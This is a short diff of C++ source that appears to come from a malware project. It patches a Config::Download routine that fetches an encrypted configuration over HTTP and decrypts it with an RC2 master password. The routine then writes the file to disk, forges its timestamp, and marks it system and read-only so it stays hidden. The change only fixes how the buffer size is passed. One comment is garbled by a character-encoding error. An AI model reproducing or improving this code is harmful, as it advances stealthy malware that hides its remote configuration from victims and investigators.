@@ -581,12 +581,13 @@ bool Config::Download(PCHAR URL)
 	if (!HTTP::Get(URL, &Buf, NULL))
 		return false;
 
+    DWORD Size = STR::Length(Buf);
 	// Ðאסרטפנמגûגאול פאיכ
 	#ifdef CryptHTTPH
 	if (!IsConfig(Buf))
 	{
 		PCHAR Password = GetMainPassword();
-		RC2Crypt::DecodeStr(Password, Buf);
+		RC2Crypt::DecodeStr(Password, Buf, Size);
 		STR::Free(Password);
 	}
 	#endif
@@ -600,7 +601,7 @@ bool Config::Download(PCHAR URL)
 
 		pSetFileAttributesA(FileName.t_str(), FILE_ATTRIBUTE_ARCHIVE);
 
-		File::WriteBufferA(FileName.t_str(), Buf, STR::Length(Buf));
+		File::WriteBufferA(FileName.t_str(), Buf, Size);
 
 		SetFakeFileDateTime(FileName.t_str());
 		pSetFileAttributesA(FileName.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
